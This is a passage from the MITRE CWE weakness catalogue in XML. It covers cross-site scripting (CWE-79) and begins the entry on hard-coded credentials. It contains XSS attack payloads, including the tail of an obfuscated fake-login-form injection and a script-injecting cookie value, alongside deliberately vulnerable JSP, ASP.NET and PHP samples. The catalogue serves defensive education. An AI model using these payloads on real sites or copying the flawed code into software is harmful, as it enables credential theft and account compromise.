9\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073<xhtml:br/>\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022<xhtml:br/>\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E<xhtml:br/>\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D<xhtml:br/>\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C<xhtml:br/>\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F<xhtml:br/>\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D');&lt;/script&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>Both of these attack links will result in the fake login box appearing on the page, and users are more likely to ignore indecipherable text at the end of URLs.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code displays a Reflected XSS (Type 1) scenario.</Intro_Text>
               <Body_Text>The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.</Body_Text>
               <Example_Code Nature="Bad" Language="JSP">
                  <xhtml:div>&lt;% String eid = request.getParameter("eid"); %&gt;<xhtml:br/>...<xhtml:br/>Employee ID: &lt;%= eid %&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The following ASP.NET code segment reads an employee ID number from an HTTP request and displays it to the user.</Body_Text>
               <Example_Code Nature="Bad" Language="ASP.NET">
                  <xhtml:div>&lt;%<xhtml:br/>protected System.Web.UI.WebControls.TextBox Login;<xhtml:br/>protected System.Web.UI.WebControls.Label EmployeeID;<xhtml:br/>...<xhtml:br/>EmployeeID.Text = Login.Text;<xhtml:br/>%&gt;<xhtml:br/>
                     <xhtml:br/>&lt;p&gt;&lt;asp:label id="EmployeeID" runat="server" /&gt;&lt;/p&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The code in this example operates correctly if the Employee ID variable contains only standard alphanumeric text. If it has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code displays a Stored XSS (Type 2) scenario.</Intro_Text>
               <Body_Text>The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.</Body_Text>
               <Example_Code Nature="Bad" Language="JSP">
                  <xhtml:div>&lt;%Statement stmt = conn.createStatement();<xhtml:br/>ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);<xhtml:br/>if (rs != null) {<xhtml:div style="margin-left:1em;">rs.next();<xhtml:br/>String name = rs.getString("name");</xhtml:div>}%&gt;<xhtml:br/>
                     <xhtml:br/>Employee Name: &lt;%= name %&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The following ASP.NET code segment queries a database for an employee with a given employee ID and prints the name corresponding with the ID.</Body_Text>
               <Example_Code Nature="Bad" Language="ASP.NET">
                  <xhtml:div>&lt;%<xhtml:br/>protected System.Web.UI.WebControls.Label EmployeeName;<xhtml:br/>...<xhtml:br/>string query = "select * from emp where id=" + eid;<xhtml:br/>sda = new SqlDataAdapter(query, conn);<xhtml:br/>sda.Fill(dt);<xhtml:br/>string name = dt.Rows[0]["Name"];<xhtml:br/>...<xhtml:br/>EmployeeName.Text = name;%&gt;<xhtml:br/>&lt;p&gt;&lt;asp:label id="EmployeeName" runat="server" /&gt;&lt;/p&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code consists of two separate pages in a web application, one devoted to creating user accounts and another devoted to listing active users currently logged in. It also displays a Stored XSS (Type 2) scenario.</Intro_Text>
               <Body_Text>CreateUser.php</Body_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$username = mysql_real_escape_string($username);<xhtml:br/>$fullName = mysql_real_escape_string($fullName);<xhtml:br/>$query = sprintf('Insert Into users (username,password) Values ("%s","%s","%s")', $username, crypt($password),$fullName) ;<xhtml:br/>mysql_query($query);<xhtml:br/>/.../</xhtml:div>
               </Example_Code>
               <Body_Text>The code is careful to avoid a SQL injection attack (CWE-89) but does not stop valid HTML from being stored in the database. This can be exploited later when ListUsers.php retrieves the information:</Body_Text>
               <Body_Text>ListUsers.php</Body_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$query = 'Select * From users Where loggedIn=true';<xhtml:br/>$results = mysql_query($query);<xhtml:br/>
                     <xhtml:br/>if (!$results) {<xhtml:div style="margin-left:1em;">exit;</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>//Print list of users to page</xhtml:i>
                     <xhtml:br/>echo '&lt;div id="userlist"&gt;Currently Active Users:';<xhtml:br/>while ($row = mysql_fetch_assoc($results)) {<xhtml:div style="margin-left:1em;">echo '&lt;div class="userNames"&gt;'.$row['fullname'].'&lt;/div&gt;';</xhtml:div>}<xhtml:br/>echo '&lt;/div&gt;';</xhtml:div>
               </Example_Code>
               <Body_Text>The attacker can set their name to be arbitrary HTML, which will then be displayed to all visitors of the Active Users page. This HTML can, for example, be a password stealing Login message.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code is a simplistic message board that saves messages in HTML format and appends them to a file.  When a new user arrives in the room, it makes an announcement:</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$name = $_COOKIE["myname"];<xhtml:br/>$announceStr = "$name just logged in.";<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>//save HTML-formatted message to file; implementation details are irrelevant for this example.</xhtml:i>
                     <xhtml:br/>
				saveMessage($announceStr);</xhtml:div>
               </Example_Code>
               <Body_Text>An attacker may be able to perform an HTML injection (Type 2 XSS) attack by setting a cookie to a value like:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>&lt;script&gt;document.alert('Hacked');&lt;/script&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The raw contents of the message file would look like:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>&lt;script&gt;document.alert('Hacked');&lt;/script&gt; has logged in.</xhtml:div>
               </Example_Code>
               <Body_Text>For each person who visits the message page, their browser would execute the script, generating a pop-up window that says "Hacked". More malicious attacks are possible; see the rest of this entry.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2021-25926</Reference>
               <Description>Python Library Manager did not sufficiently neutralize a user-supplied search term, allowing reflected XSS.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-25926</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-25963</Reference>
               <Description>Python-based e-commerce platform did not escape returned content on error pages, allowing for reflected Cross-Site Scripting attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-25963</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-1879</Reference>
               <Description>Universal XSS in mobile operating system, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-1879</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-3580</Reference>
               <Description>Chain: improper input validation (CWE-20) in firewall product leads to XSS (CWE-79), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-3580</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2014-8958</Reference>
               <Description>Admin GUI allows XSS through cookie.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2014-8958</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-9764</Reference>
               <Description>Web stats program allows XSS through crafted HTTP header.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-9764</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2014-5198</Reference>
               <Description>Web log analysis product allows XSS through crafted HTTP Referer header.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2014-5198</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5080</Reference>
               <Description>Chain: protection mechanism failure allows XSS</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5080</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4308</Reference>
               <Description>Chain: incomplete denylist (CWE-184) only checks "javascript:" tag, allowing XSS (CWE-79) using other tags</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-4308</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5727</Reference>
               <Description>Chain: incomplete denylist (CWE-184) only removes SCRIPT tags, enabling XSS (CWE-79)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5727</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5770</Reference>
               <Description>Reflected XSS using the PATH_INFO in a URL</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5770</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4730</Reference>
               <Description>Reflected XSS not properly handled when generating an error message</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4730</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5734</Reference>
               <Description>Reflected XSS sent through email message.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5734</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0971</Reference>
               <Description>Stored XSS in a security product.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0971</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5249</Reference>
               <Description>Stored XSS using a wiki page.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5249</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-3568</Reference>
               <Description>Stored XSS in a guestbook application.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-3568</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-3211</Reference>
               <Description>Stored XSS in a guestbook application using a javascript: URI in a bbcode img tag.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-3211</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-3295</Reference>
               <Description>Chain: library file is not protected against a direct request (CWE-425), leading to reflected XSS (CWE-79).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-3295</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Cross-site scripting (XSS)</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Cross-site Scripting</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Cross-site scripting</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Cross Site Scripting (XSS)</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Unvalidated Input</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A4</Entry_ID>
               <Entry_Name>Cross-Site Scripting (XSS) Flaws</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>8</Entry_ID>
               <Entry_Name>Cross-site Scripting</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-79</Entry_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="209"/>
            <Related_Attack_Pattern CAPEC_ID="588"/>
            <Related_Attack_Pattern CAPEC_ID="591"/>
            <Related_Attack_Pattern CAPEC_ID="592"/>
            <Related_Attack_Pattern CAPEC_ID="63"/>
            <Related_Attack_Pattern CAPEC_ID="85"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-709"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 2: Web-Server Related Vulnerabilities (XSS, XSRF, and Response Splitting).&#34; Page 31"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 3: Web-Client Related Vulnerabilities (XSS).&#34; Page 63"/>
            <Reference External_Reference_ID="REF-712"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 13, &#34;Web-Specific Input Issues&#34; Page 413"/>
            <Reference External_Reference_ID="REF-714"/>
            <Reference External_Reference_ID="REF-715"/>
            <Reference External_Reference_ID="REF-716"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-718"/>
            <Reference External_Reference_ID="REF-719"/>
            <Reference External_Reference_ID="REF-720"/>
            <Reference External_Reference_ID="REF-721"/>
            <Reference External_Reference_ID="REF-722"/>
            <Reference External_Reference_ID="REF-723"/>
            <Reference External_Reference_ID="REF-724"/>
            <Reference External_Reference_ID="REF-725"/>
            <Reference External_Reference_ID="REF-726"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 17, &#34;Cross Site Scripting&#34;, Page 1071"/>
            <Reference External_Reference_ID="REF-956"/>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-79"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">
               <xhtml:p>There can be a close relationship between XSS and CSRF (CWE-352).  An attacker might use CSRF in order to trick the victim into submitting requests to the server in which the requests contain an XSS payload.  A well-known example of this was the Samy worm on MySpace [REF-956]. The worm used XSS to insert malicious HTML sequences into a user's profile and add the attacker as a MySpace friend.  MySpace friends of that victim would then execute the payload to modify their own profiles, causing the worm to propagate exponentially. Since the victims did not intentionally insert the malicious script themselves, CSRF was a root cause.</xhtml:p>
            </Note>
            <Note Type="Applicable Platform">
               <xhtml:p>XSS flaws are very common in web applications, since they require a great deal of developer discipline to avoid them.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
			   <Modification_Version>1.0</Modification_Version>
			   <Modification_ReleaseDate>2008-09-09</Modification_ReleaseDate>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
			   <Modification_Version>1.0</Modification_Version>
			   <Modification_ReleaseDate>2008-09-09</Modification_ReleaseDate>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Background_Details, Common_Consequences, Description, Relationships, Other_Notes, References, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Background_Details, Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Enabling_Factors_for_Exploitation, Name, Observed_Examples, Other_Notes, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Detection_Factors, Enabling_Factors_for_Exploitation, Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Name, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Demonstrative_Examples, Enabling_Factors_for_Exploitation, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Demonstrative_Examples, Description, Observed_Examples, References, Relationship_Notes, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Background_Details, Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Demonstrative_Examples, Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Cross-site Scripting (XSS)</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-01-12">Failure to Sanitize Directives in a Web Page (aka 'Cross-site scripting' (XSS))</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Preserve Web Page Structure (aka 'Cross-site Scripting')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Failure to Preserve Web Page Structure ('Cross-site Scripting')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="798" Name="Use of Hard-coded Credentials" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product contains hard-coded credentials, such as a password or cryptographic key, which it uses for its own inbound authentication, outbound communication to external components, or encryption of internal data.</Description>
         <Extended_Description>
            <xhtml:p>Hard-coded credentials typically create a significant hole that allows an attacker to bypass the authentication that has been configured by the product administrator. This hole might be difficult for the system administrator to detect. Even if detected, it can be difficult to fix, so the administrator may be forced into disabling the product entirely. There are two main variations:</xhtml:p>
            <xhtml:div style="margin-left:1em;">
               <xhtml:div>Inbound: the product contains an authentication mechanism that checks the input credentials against a hard-coded set of credentials.</xhtml:div>
               <xhtml:div>Outbound: the product connects to another system or component, and it contains hard-coded credentials for connecting to that component.</xhtml:div>
            </xhtml:div>
            <xhtml:p>In the Inbound variant, a default administration account is created, and a simple password is hard-coded into the product and associated with that account. This hard-coded password is the same for each installation of the product, and it usually cannot be changed or disabled by system administrators without manually modifying the program, or otherwise patching the product. If the password is ever discovered or published (a common occurrence on the Internet), then anybody with knowledge of this password can access the product. Finally, since all installations of the product will have the same password, even across different organizations, this enables massive attacks such as worms to take place.</xhtml:p>
            <xhtml:p>The Outbound variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password which can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end product. Any user of that program may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat, since the extraction of a password from a binary is usually very simple.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="1391" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="344" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="671" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="257" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Mobile" Prevalence="Undetermined"/>
            <Technology Class="ICS/OT" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>If hard-coded passwords are used, it is almost certain that malicious users will gain access to the account in question.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
